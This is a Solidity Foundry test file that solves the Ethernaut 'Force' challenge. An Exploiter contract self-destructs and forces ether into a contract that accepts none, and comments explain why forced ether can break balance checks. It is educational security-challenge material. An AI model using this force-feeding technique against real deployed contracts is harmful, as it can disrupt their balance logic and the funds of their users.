// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Force.sol";
import "src/levels/ForceFactory.sol";
import "forge-std/console2.sol";

contract TestForce is BaseTest {
    Force private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new ForceFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = Force(levelAddress);

        // Check that the contract is correctly setup
        assertEq(address(level).balance, 0);
    }

    function exploitLevel() internal override {
        vm.startPrank(player, player);

        /** CODE YOUR EXPLOIT HERE */
        // https://ethernaut.openzeppelin.com/level/0x22699e6AdD7159C3C385bf4d7e1C647ddB3a99ea

        // There are 4 way to send ether to a contract
        // 1) they implement a `payable` function
        // 2) they implement a `receive` function. A special function to receive ether
        // 3) they implement a `fallback` payable function. A special function automatically triggered
        // when you call a contract's function that does not exist
        // 4) a contract call selfdestruct() (destroying itself) and specifying the destination to send it's balance to

        // In this specific case `Force` contract does not implement any of the first three method
        // so you can only send ether via the selfdestruct
        // Why is important to know that a contract can receive ether even if they don't want to?
        // because it could mess up your balance logic!
        // More info on the topic
        // - https://consensys.github.io/smart-contract-best-practices/attacks/force-feeding/
        // - https://solidity-by-example.org/sending-ether/
        // - https://swcregistry.io/docs/SWC-132
        // - https://medium.com/@nmcl/gridlock-a-smart-contract-bug-73b8310608a9

        new Exploiter{value: 1}(payable(address((level))));
        // Check we have solved the challenge
        assertEq(address(level).balance, 1);

        vm.stopPrank();
    }
}

contract Exploiter {
    constructor(address payable to) public payable {
        // redirect all the `msg.value` to `to` when selfdestructing
        selfdestruct(to);
    }
}
